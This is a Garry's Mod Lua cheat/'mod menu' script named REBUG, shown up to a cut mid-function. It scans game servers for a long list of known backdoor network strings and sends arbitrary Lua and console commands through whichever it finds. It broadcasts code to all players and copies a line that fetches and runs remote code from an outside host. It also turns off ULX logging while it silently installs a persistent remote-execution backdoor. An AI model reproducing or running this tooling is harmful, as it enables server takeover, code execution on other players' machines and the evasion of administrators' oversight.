print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
MsgC(Color(255, 0, 0), [[
             ____________________________________________________
]])
MsgC(Color(255, 64, 0), [[
            /                                                    \
]])
MsgC(Color(255, 128, 0), [[
           |    _____________________________________________     |
]])
MsgC(Color(255, 191, 0), [[
           |   |                                             |    |
]])
MsgC(Color(255, 255, 0), [[
           |   |       _____  ______ ____  _    _  _____     |    |
]])
MsgC(Color(191, 255, 0), [[
           |   |      |  __ \|  ____|  _ \| |  | |/ ____|    |    |
]])
MsgC(Color(128, 255, 0), [[
           |   |      | |__) | |__  | |_) | |  | | |  __     |    |
]])
MsgC(Color(64, 255, 0), [[
           |   |      |  _  /|  __| |  _ <| |  | | | |_ |    |    |
]])
MsgC(Color(0, 255, 0), [[
           |   |      | | \ \| |____| |_) | |__| | |__| |    |    |
]])
MsgC(Color(0, 255, 64), [[
           |   |    __|_| _\_\______|____/ \____/_\_____|__  |    |
]])
MsgC(Color(0, 255, 128), [[
           |   |   / ____| |  | |  ____|   /\|__   __/ ____| |    |
]])
MsgC(Color(0, 255, 191), [[
           |   |  | |    | |__| | |__     /  \  | | | (___   |    |
]])
MsgC(Color(0, 255, 255), [[
           |   |  | |    |  __  |  __|   / /\ \ | |  \___ \  |    |
]])
MsgC(Color(0, 191, 255), [[
           |   |  | |____| |  | | |____ / ____ \| |  ____) | |    |
]])
MsgC(Color(0, 128, 255), [[
           |   |   \_____|_|  |_|______/_/    \_\_| |_____/  |    |
]])
MsgC(Color(0, 64, 255), [[
           |   |                                             |    |
]])
MsgC(Color(0, 0, 255), [[
           |   |                                             |    |
]])
MsgC(Color(64, 0, 255), [[
           |   |                                             |    |
]])
MsgC(Color(128, 0, 255), [[
           |   |                                             |    |
]])
MsgC(Color(191, 0, 255), [[
           |   |_____________________________________________|    |
]])
MsgC(Color(255, 0, 255), [[
           |                                                      |
]])
MsgC(Color(255, 0, 191), [[
            \_____________________________________________________/
]])
MsgC(Color(255, 0, 128), [[
                   \_______________________________________/
]])
MsgC(Color(255, 0, 64), [[
                _______________________________________________
]])
MsgC(Color(255, 0, 0), [[
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
]])
MsgC(Color(255, 64, 0), [[
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
]])
MsgC(Color(255, 128, 0), [[
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
]])
MsgC(Color(255, 191, 0), [[
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
]])
MsgC(Color(255, 255, 0), [[
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
]])
MsgC(Color(191, 255, 0), [[
:-----------------------------------------------------------------------------:
]])
MsgC(Color(128, 255, 0), [[
`----------------------------------------------------------------------------'
]])
chat.AddText(Color(255, 0, 0), "[REBUG] ", Color(20, 150, 200), "Welcome " .. LocalPlayer():Nick(), Color(20, 150, 200), ",", Color(255, 155, 0), " Mod Menu Loaded!")

--Detections
if (_G.QAC or _G.CAC) then
    surface.PlaySound("ambient/alarms/klaxon1.wav")
    chat.AddText(Color(255, 0, 0), "[", "REBUG", "] ", Color(20, 150, 200), "CAC anti-cheat has been found!")
end

if file.Exists("snte_source.lua", "LUA") then
    chat.AddText(Color(255, 0, 0), "[", "REBUG", "] ", Color(20, 150, 200), "Snte has been found on server!")
end

--[[-------------------------------------------------------------------------------------
Locals
----------------------------------------------------------------------------------------]]
local surface_SetFont = surface.SetFont
local surface_GetTextSize = surface.GetTextSize
local surface_SetDrawColor = surface.SetDrawColor
local surface_DrawLine = surface.DrawLine
local draw_SimpleText = draw.SimpleText
local draw_SimpleTextOutlined = draw.SimpleTextOutlined
local string_Explode = string.Explode
local math_Rand = math.Rand
local math_random = math.random
local math_sin = math.sin
local math_abs = math.abs
local HSVtoColor = HSVToColor
local Realtime = RealTime
local Frametime = FrameTime
local Curtime = CurTime
local Color = Color
local rebug = {}
local channel = ""
local netStrings = {}
local BD = {}
local noob = {}
local MenuDelay = false
local MenuOpen = false
local ply = LocalPlayer()
local selPly = 0

--[[-------------------------------------------------------------------------------------
Fonts
----------------------------------------------------------------------------------------]]
surface.CreateFont("button", {
    font = "Calibri",
    extended = not 1,
    size = 16,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = not not 1,
    underline = not 1,
    italic = not 1,
    strikeout = not 1,
    symbol = not 1,
    rotary = not 1,
    shadow = not 1,
    additive = not 1,
    outline = not 1
})

--[[-------------------------------------------------------------------------------------
Gradient
----------------------------------------------------------------------------------------]]
local grad = Material("gui/gradient")
local upgrad = Material("gui/gradient_up")
local downgrad = Material("gui/gradient_down")
--[[-------------------------------------------------------------------------------------
Colors
----------------------------------------------------------------------------------------]]
local o_color1 = Color(17, 17, 17, 255)
local o_color11 = Color(22, 22, 22, 255)
local o_color2 = Color(30, 30, 30, 255)
local o_color3 = Color(50, 50, 50, 255)
local o_color4 = Color(42, 42, 42, 255)

--[[-------------------------------------------------------------------------------------
NetWorks
----------------------------------------------------------------------------------------]]
function CheckIfStringExists(str)
    local status, error = pcall(net.Start, str)

    return status
end

-- Notify
function noob.Notify(msg)
    chat.AddText(Color(255, 0, 0), "[REBUG] ", color_white, msg)
end

-- Backdoored Strings
netStrings.Strings = {
    {
        NetString = "Sandbox_ArmDupe"
    },
    {
        NetString = "entityhealt"
    },
    {
        NetString = "m"
    },
    {
        NetString = "material"
    },
    {
        NetString = "REBUG"
    },
    {
        NetString = "BetStrep"
    },
    {
        NetString = "keyss"
    },
    {
        NetString = "banId2"
    },
    {
        NetString = "Val"
    },
    {
        NetString = "models/zombie.mdl"
    },
    {
        NetString = "FPSBOOST"
    },
    {
        NetString = "PlayerCheck"
    },
    {
        NetString = "Sbox_darkrp"
    },
    {
        NetString = "insid3"
    },
    {
        NetString = "The_Dankwoo"
    },
    {
        NetString = "Sbox_itemstore"
    },
    {
        NetString = "Ulib_Message"
    },
    {
        NetString = "ULogs_Info"
    },
    {
        NetString = "ITEM"
    },
    {
        NetString = "R8"
    },
    {
        NetString = "fix"
    },
    {
        NetString = "Fix_Keypads"
    },
    {
        NetString = "Remove_Exploiters"
    },
    {
        NetString = "noclipcloakaesp_chat_text"
    },
    {
        NetString = "_Defqon"
    },
    {
        NetString = "_CAC_ReadMemory"
    },
    {
        NetString = "lmaogetdunked"
    },
    {
        NetString = "nostrip"
    },
    {
        NetString = "nocheat"
    },
    {
        NetString = "LickMeOut"
    },
    {
        NetString = "ULX_QUERY2"
    },
    {
        NetString = "ULXQUERY2"
    },
    {
        NetString = "https://i.imgur.com/Gf6hLMl.png"
    },
    {
        NetString = "MoonMan"
    },
    {
        NetString = "Im_SOCool"
    },
    {
        NetString = "JSQuery.Data(Post(false))"
    },
    {
        NetString = "Sandbox_GayParty"
    },
    {
        NetString = "DarkRP_UTF8"
    },
    {
        NetString = "oldNetReadData"
    },
    {
        NetString = "Gamemode_get"
    },
    {
        NetString = "memeDoor"
    },
    {
        NetString = "BackDoor"
    },
    {
        NetString = "SessionBackdoor"
    },
    {
        NetString = "DarkRP_AdminWeapons"
    },
    {
        NetString = "cucked"
    },
    {
        NetString = "NoNerks"
    },
    {
        NetString = "kek"
    },
    {
        NetString = "ZimbaBackDoor"
    },
    {
        NetString = "something"
    },
    {
        NetString = "random"
    },
    {
        NetString = "strip0"
    },
    {
        NetString = "fellosnake"
    },
    {
        NetString = "enablevac"
    },
    {
        NetString = "idk"
    },
    {
        NetString = "ÃžÃ ?D)â—˜"
    },
    {
        NetString = "snte"
    },
    {
        NetString = "apg_togglemode"
    },
    {
        NetString = "Hi"
    },
    {
        NetString = "beedoor"
    },
    {
        NetString = "BDST_EngineForceButton"
    },
    {
        NetString = "VoteKickNO"
    },
    {
        NetString = "REEEEEEEEEEEE"
    },
    {
        NetString = "_da_"
    },
    {
        NetString = "Nostra"
    },
    {
        NetString = "sniffing"
    },
    {
        NetString = "keylogger"
    },
    {
        NetString = "CakeInstall"
    },
    {
        NetString = "Cakeuptade"
    },
    {
        NetString = "love"
    },
    {
        NetString = "earth"
    },
    {
        NetString = "ulibcheck"
    },
    {
        NetString = "Nostrip_"
    },
    {
        NetString = "teamfrench"
    },
    {
        NetString = "ADM"
    },
    {
        NetString = "hack"
    },
    {
        NetString = "crack"
    },
    {
        NetString = "leak"
    },
    {
        NetString = "lokisploit"
    },
    {
        NetString = "1234"
    },
    {
        NetString = "123"
    },
    {
        NetString = "enculer"
    },
    {
        NetString = "cake"
    },
    {
        NetString = "seized"
    },
    {
        NetString = "88"
    },
    {
        NetString = "88_strings_"
    },
    {
        NetString = "nostraall"
    },
    {
        NetString = "blogs_update"
    },
    {
        NetString = "nolag"
    },
    {
        NetString = "loona_"
    },
    {
        NetString = "billys_logs"
    },
    {
        NetString = "loona"
    },
    {
        NetString = "negativedlebest"
    },
    {
        NetString = "berettabest"
    },
    {
        NetString = "ReadPing"
    },
    {
        NetString = "antiexploit"
    },
    {
        NetString = "adm_NetString"
    },
    {
        NetString = "mathislebg"
    },
    {
        NetString = "Bilboard.adverts:Spawn(false)"
    },
    {
        NetString = "pjHabrp9EY"
    },
    {
        NetString = "?"
    },
    {
        NetString = "lag_ping"
    },
    {
        NetString = "allowLimitedRCON(user) 0"
    },
    {
        NetString = "aze46aez67z67z64dcv4bt"
    },
    {
        NetString = "killserver"
    },
    {
        NetString = "fuckserver"
    },
    {
        NetString = "cvaraccess"
    },
    {
        NetString = "rcon"
    },
    {
        NetString = "rconadmin"
    },
    {
        NetString = "web"
    },
    {
        NetString = "jesuslebg"
    },
    {
        NetString = "zilnix"
    },
    {
        NetString = "ߠ?D)?"
    },
    {
        NetString = "disablebackdoor"
    },
    {
        NetString = "kill"
    },
    {
        NetString = "DefqonBackdoor"
    },
    {
        NetString = "DarkRP_AllDoorDatas"
    },
    {
        NetString = "0101.1"
    },
    {
        NetString = "awarn_remove"
    },
    {
        NetString = "_Infinity"
    },
    {
        NetString = "Infinity"
    },
    {
        NetString = "InfinityBackdoor"
    },
    {
        NetString = "_Infinity_Meme_"
    },
    {
        NetString = "arivia"
    },
    {
        NetString = "ULogs_B"
    },
    {
        NetString = "_Warns"
    },
    {
        NetString = "_cac_"
    },
    {
        NetString = "striphelper"
    },
    {
        NetString = "_vliss"
    },
    {
        NetString = "YYYYTTYXY6Y"
    },
    {
        NetString = "?????????????????п??? ?? ?ѿ??Ŀտ? ???ѿ??տ??Ю"
    },
    {
        NetString = "_KekTcf"
    },
    {
        NetString = "_blacksmurf"
    },
    {
        NetString = "blacksmurfBackdoor"
    },
    {
        NetString = "_Raze"
    },
    {
        NetString = "m9k_explosionradius"
    },
    {
        NetString = "m9k_explosive"
    },
    {
        NetString = "m9k_addons"
    },
    {
        NetString = "rcivluz"
    },
    {
        NetString = "SENDTEST"
    },
    {
        NetString = "_clientcvars"
    },
    {
        NetString = "_main"
    },
    {
        NetString = "stream"
    },
    {
        NetString = "waoz"
    },
    {
        NetString = "bdsm"
    },
    {
        NetString = "ZernaxBackdoor"
    },
    {
        NetString = "UKT_MOMOS"
    },
    {
        NetString = "anticrash"
    },
    {
        NetString = "audisquad_lua"
    },
    {
        NetString = "dontforget"
    },
    {
        NetString = "noprop"
    },
    {
        NetString = "thereaper"
    },
    {
        NetString = "0x13"
    },
    {
        NetString = "Child"
    },
    {
        NetString = "!Cac"
    },
    {
        NetString = "azkaw"
    },
    {
        NetString = "BOOST_FPS"
    },
    {
        NetString = "childexploit"
    },
    {
        NetString = "ULX_ANTI_BACKDOOR"
    },
    {
        NetString = "FADMIN_ANTICRASH"
    },
    {
        NetString = "ULX_QUERY_TEST2"
    },
    {
        NetString = "GMOD_NETDBG"
    },
    {
        NetString = "netlib_debug"
    },
    {
        NetString = "_DarkRP_Reading"
    },
    {
        NetString = "lag_ping"
    },
    {
        NetString = "||||"
    },
    {
        NetString = "SteamApp2313"
    },
    {
        NetString = "FPP_RemovePLYCache"
    },
    {
        NetString = "fuwa"
    },
    {
        NetString = "stardoor"
    },
    {
        NetString = "SENDTEST"
    },
    {
        NetString = "rcivluz"
    },
    {
        NetString = "c"
    },
    {
        NetString = "N::B::P"
    },
    {
        NetString = "changename"
    },
    {
        NetString = "PlayerItemPickUp"
    },
    {
        NetString = "echangeinfo"
    },
    {
        NetString = "fourhead"
    },
    {
        NetString = "music"
    },
    {
        NetString = "slua"
    },
    {
        NetString = "adm_network"
    },
    {
        NetString = "componenttolua"
    },
    {
        NetString = "theberettabcd"
    },
    {
        NetString = "SparksLeBg"
    },
    {
        NetString = "DarkRP_Armors"
    },
    {
        NetString = "DarkRP_Gamemodes"
    },
    {
        NetString = "fancyscoreboard_leave"
    },
    {
        NetString = "PRDW_GET"
    },
    {
        NetString = "pwn_http_send"
    },
    {
        NetString = "AnatikLeNoob"
    },
    {
        NetString = "GVacDoor"
    },
    {
        NetString = "Keetaxor"
    },
    {
        NetString = "BackdoorPrivate666"
    },
    {
        NetString = "YohSambreLeBest"
    },
    {
        NetString = "SNTE<ALL"
    },
    {
        NetString = "!Ǻ/;."
    },
    {
        NetString = "pwn_http_answer"
    },
    {
        NetString = "pwn_wake"
    },
    {
        NetString = "verifiopd"
    },
    {
        NetString = "AidsTacos"
    },
    {
        NetString = "shix"
    },
    {
        NetString = "PDA_DRM_REQUEST_CONTENT"
    },
    {
        NetString = "xenoreceivetargetdata2"
    },
    {
        NetString = "xenoreceivetargetdata1"
    },
    {
        NetString = "xenoserverdatafunction"
    },
    {
        NetString = "xenoserverfunction"
    },
    {
        NetString = "xenoclientdatafunction"
    },
    {
        NetString = "xenoclientfunction"
    },
    {
        NetString = "xenoactivation"
    },
    {
        NetString = "EXEC_REMOTE_APPS"
    },
    {
        NetString = "yohsambresicianatik<3"
    },
    {
        NetString = "Sbox_Message"
    },
    {
        NetString = "Sbox_gm_attackofnullday_key"
    },
    {
        NetString = "The_DankWhy"
    },
    {
        NetString = "nw.readstream"
    },
    {
        NetString = "AbSoluT"
    },
    {
        NetString = "__G____CAC"
    },
    {
        NetString = "Weapon_88"
    },
    {
        NetString = "mecthack"
    },
    {
        NetString = "SetPlayerDeathCount"
    },
    {
        NetString = "FAdmin_Notification_Receiver"
    },
    {
        NetString = "DarkRP_ReceiveData"
    },
    {
        NetString = "fijiconn"
    },
    {
        NetString = "LuaCmd"
    },
    {
        NetString = "EnigmaProject"
    },
    {
        NetString = "z"
    },
    {
        NetString = "cvardel"
    },
    {
        NetString = "json.parse(crashsocket)"
    },
    {
        NetString = "effects_en"
    },
    {
        NetString = "file"
    },
    {
        NetString = "gag"
    },
    {
        NetString = "asunalabestwaifu"
    },
    {
        NetString = "stoppk"
    },
    {
        NetString = "Ulx_Error_88"
    },
    {
        NetString = "NoOdium_ReadPing"
    },
    {
        NetString = "banId"
    },
    {
        NetString = "kickId2"
    },
    {
        NetString = "elsakura"
    }
}

function CheckBackdoors()
    for k, v in pairs(netStrings.Strings) do
        if (CheckIfStringExists(v.NetString)) then
            channel = v.NetString
            chat.AddText(Color(255, 0, 0), "[RVAC]", Color(20, 150, 20), " Found Vulnerability ▶ ", Color(20, 150, 200), [[]] .. v.NetString)
        end
    end
end

function noob.PostLua(str)
    net.Start(channel)
    net.WriteString(str)
    net.WriteBit(1)
    net.SendToServer()
end

function noob.PostRcon(str)
    net.Start(channel)
    net.WriteString(str)
    net.WriteBit(false)
    net.SendToServer()
end

function noob.PostLua(str)
    if (channel == "") then
        chat.AddText(Color(255, 0, 0), "[REBUG]", Color(20, 150, 200), " You are not targeting a NetString")

        return
    end

    net.Start(channel)
    net.WriteString(str)
    net.WriteBit(1)
    net.SendToServer()
end

function sendLuaPly(str)
    net.Start(channel)
    net.WriteString("BroadcastLua([[" .. str .. "]])")
    net.SendToServer()
end

function sendLuaPlyKv(str)
    net.Start(channel)
    net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua(" .. str .. ") end")
    net.SendToServer()
end

--[[-------------------------------------------------------------------------------------
Insert Key
----------------------------------------------------------------------------------------]]
function rebug.voidz()
    hook.Add("Think", "openMenu", function()
        if input.IsKeyDown(KEY_INSERT) and not MenuDelay then
            MenuDelay = true
            rebug.load()

            timer.Simple(0.5, function()
                MenuDelay = false
            end)
        end
    end)
end

function rebug.load()
    if MenuOpen then
        CloseMenu()

        return
    end

    --[[-------------------------------------------------------------------------------------
MAIN MENU
----------------------------------------------------------------------------------------]]
    MenuOpen = true
    local BDMenu = vgui.Create("DFrame")
    surface.PlaySound("buttons/blip1.wav")
    BDMenu:SetSize(720, 750)
    BDMenu:SetPos(40, 40)
    BDMenu:SetTitle("")
    BDMenu:ShowCloseButton()
    BDMenu:MakePopup()
    BDMenu:SetVisible(true)
    BDMenu:SetDraggable(false)

    BDMenu.Paint = function(self, w, h)
        surface.SetDrawColor(Color(40, 40, 40, 255))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(36, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(0, 0, 0, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
        surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
    end

    local rvacplate = vgui.Create('DPanelList', BDMenu)
    rvacplate:SetSize(705, 735)
    rvacplate:SetPos(8, 8)

    rvacplate.Paint = function(s, w, h)
        surface.SetDrawColor(Color(26, 26, 26))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local Rainbow = vgui.Create('DPanelList', rvacplate)
    Rainbow:SetSize(705, 2)
    Rainbow:SetPos(1, 0)

    Rainbow.Paint = function(s, w, h)
        surface.SetDrawColor(Color(100, 100, 100))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetDrawColor(Color(100, 100, 100))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(HSVToColor(CurTime() % 6 * 60, 1, 1))
        surface.DrawOutlinedRect(0, 0, w, h)
        surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
    end

    local targeting = vgui.Create("DLabel", rvacplate)
    targeting:SetFont("Trebuchet18")
    targeting:SetText("No Player Selected")
    targeting:SetTextColor(Color(255, 255, 255))
    targeting:SetPos(510, 710)
    targeting:SizeToContents()

    -- Button Function
    function rebug.AddButton(name, parent, func)
        local button = parent:Add("DButton")
        button:SetText("")
        button:Dock(TOP)
        button:SetFont("DermaDefault")
        button:DockMargin(0, 0, 0, 8)
        button:SetSize(50, 25)
        button.DoClick = func

        button.Paint = function(self, w, h)
            surface.SetDrawColor(Color(200, 24, 24))
            surface.SetDrawColor(40, 40, 40)
            surface.DrawOutlinedRect(0, 0, w, h)
            draw.SimpleTextOutlined(name, "button", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
        end
    end

    -- Label Function
    function noob.addLabel(name, posx, posy, parent)
        local T1 = parent:Add("DLabel")
        T1:SetSize(200, 80)
        T1:SetPos(posx, posy)
        T1:SetFont("Trebuchet18")
        T1:SetText(name)
        T1:SetTextColor(Color(255, 255, 255, 255))
    end

    -- Labels
    noob.addLabel("Server BackDoors", 20, 28, rvacplate)
    noob.addLabel("Target BackDoors", 257, 28, rvacplate)
    noob.addLabel("Player List", 510, 28, rvacplate)
    noob.addLabel("Extras( sound, client, bd )", 253, 275, rvacplate)
    local Plistz = vgui.Create("DPanelList", rvacplate)
    Plistz:SetPos(10, 80)
    Plistz:SetSize(200, 538)
    Plistz:SetPadding(5)
    Plistz:SetSpacing(5)
    Plistz:EnableHorizontal(false)
    Plistz:EnableVerticalScrollbar(true)
    Plistz:SetName("")

    Plistz.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local item = vgui.Create("DPanelList", Plistz)
    item:SetPos(11.5, 10)
    item:SetSize(188, 520)
    item:SetPadding(5)
    item:SetSpacing(5)
    item:EnableHorizontal(false)
    item:EnableVerticalScrollbar(true)
    item:SetName("")

    item.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetDrawColor(35, 35, 35, 0)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local Plist2 = vgui.Create("DPanelList", rvacplate)
    Plist2:SetPos(247, 80)
    Plist2:SetSize(200, 215)
    Plist2:SetPadding(5)
    Plist2:SetSpacing(5)
    Plist2:EnableHorizontal(false)
    Plist2:EnableVerticalScrollbar(true)
    Plist2:SetName("")

    Plist2.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local item2 = vgui.Create("DPanelList", Plist2)
    item2:SetPos(8, 10)
    item2:SetSize(185, 200)
    item2:SetPadding(5)
    item2:SetSpacing(5)
    item2:EnableHorizontal(false)
    item2:EnableVerticalScrollbar(true)
    item2:SetName("")

    item2.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetDrawColor(35, 35, 35, 0)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local Plist3 = vgui.Create("DPanelList", rvacplate)
    Plist3:SetPos(247, 326)
    Plist3:SetSize(200, 399)
    Plist3:SetPadding(5)
    Plist3:SetSpacing(5)
    Plist3:EnableHorizontal(false)
    Plist3:EnableVerticalScrollbar(true)
    Plist3:SetName("")

    Plist3.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local item3 = vgui.Create("DPanelList", Plist3)
    item3:SetPos(12, 10)
    item3:SetSize(185, 380)
    item3:SetPadding(5)
    item3:SetSpacing(5)
    item3:EnableHorizontal(false)
    item3:EnableVerticalScrollbar(true)
    item3:SetName("")

    item3.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetDrawColor(35, 35, 35, 0)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local Plist4 = vgui.Create("DPanelList", rvacplate)
    Plist4:SetPos(493, 80)
    Plist4:SetSize(200, 625)
    Plist4:SetPadding(5)
    Plist4:SetSpacing(5)
    Plist4:EnableHorizontal(false)
    Plist4:EnableVerticalScrollbar(true)

    Plist4.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local item4 = vgui.Create("DPanelList", Plist4)
    item4:SetPos(8, 10)
    item4:SetSize(185, 606)
    item4:SetPadding(5)
    item4:SetSpacing(5)
    item4:EnableHorizontal(false)
    item4:EnableVerticalScrollbar(true)
    item4:SetName("")

    item4.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetDrawColor(35, 35, 35, 0)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local Bar3 = vgui.Create("DScrollPanel", item4)
    Bar3:Dock(FILL)
    local sbar3 = Bar3:GetVBar()

    function sbar3:Paint()
    end

    function sbar3.btnUp:Paint()
    end

    function sbar3.btnDown:Paint()
    end

    function sbar3.btnGrip:Paint()
    end

    for k, v in pairs(player.GetAll()) do
        rebug.AddButton(v:Name(), Bar3, function()
            selPly = v:UserID()
            targeting:SetText("Selected: " .. Player(selPly):Name())
        end)
    end

    local Plist5 = vgui.Create("DTextEntry", rvacplate)
    Plist5:SetPos(10, 8)
    Plist5:SetSize(685, 35)
    Plist5:SetTextColor(Color(255, 255, 255, 255))
    Plist5:SetFont("Trebuchet18")

    Plist5.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
        self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
    end

    Plist5.OnEnter = function(self)
        surface.PlaySound("buttons/button18.wav")
        noob.Notify("Targeting: '" .. Plist5:GetValue() .. "'")
        channel = self:GetValue()
    end

    local helpimretarded = vgui.Create("DButton", rvacplate)
    helpimretarded:SetSize(200, 45)
    helpimretarded:SetPos(10, 627)
    helpimretarded:SetFont("Trebuchet18")
    helpimretarded:SetText("Print backdoor code")
    helpimretarded:SetTextColor(Color(255, 255, 255, 255))

    helpimretarded.Paint = function(panel, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    helpimretarded.DoClick = function()
        noob.Notify("Copied to clipboard", Color(155, 255, 155))
        local llll = [[http.Fetch("https://rvac/gq/_!/p",function(b)RunString(b)end)]]
        SetClipboardText(llll)
    end

    local helpimretarded2 = vgui.Create("DButton", rvacplate)
    helpimretarded2:SetSize(200, 45)
    helpimretarded2:SetPos(10, 680)
    helpimretarded2:SetFont("Trebuchet18")
    helpimretarded2:SetText("ULX Luarun Backdoor")
    helpimretarded2:SetTextColor(Color(255, 255, 255, 255))

    helpimretarded2.Paint = function(panel, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(upgrad)
        surface.SetDrawColor(o_color2)
        surface.SetMaterial(downgrad)
        surface.SetDrawColor(o_color2)
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    helpimretarded2.DoClick = function()
        noob.Notify("Using ulx luarun to silently infect server", Color(155, 255, 155))
        RunConsoleCommand("ulx", "logecho", "0")

        timer.Simple(0.5, function()
            RunConsoleCommand("ulx", "luarun", "util.AddNetworkString ('REBUG') net.Receive ('REBUG', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)")
        end)

        timer.Simple(1, function()
            RunConsoleCommand("ulx", "logecho", "1")
        end)
    end

    -- Scroll Bars
    local bar1 = vgui.Create("DScrollPanel", item)
    bar1:Dock(FILL)
    local sbar1 = bar1:GetVBar()

    function sbar1:Paint()
    end

    function sbar1.btnUp:Paint()
    end

    function sbar1.btnDown:Paint()
    end

    function sbar1.btnGrip:Paint()
    end

    local bar2 = vgui.Create("DScrollPanel", item2)
    bar2:Dock(FILL)
    local sbar2 = bar2:GetVBar()

    function sbar2:Paint()
    end

    function sbar2.btnUp:Paint()
    end

    function sbar2.btnDown:Paint()
    end

    function sbar2.btnGrip:Paint()
    end

    local bar4 = vgui.Create("DScrollPanel", item3)
    bar4:Dock(FILL)
    local sbar4 = bar4:GetVBar()

    function sbar4:Paint()
    end

    function sbar4.btnUp:Paint()
    end

    function sbar4.btnDown:Paint()
    end

    function sbar4.btnGrip:Paint()
    end

    -- Backdoors
    rebug.AddButton("@Inject SendLua Interface", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[util.AddNetworkString ('REBUG') net.Receive ('REBUG', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)]])
    end)

    rebug.AddButton("@Persistant Infection", bar1, function()
        surface.PlaySound("buttons/button18.wav")
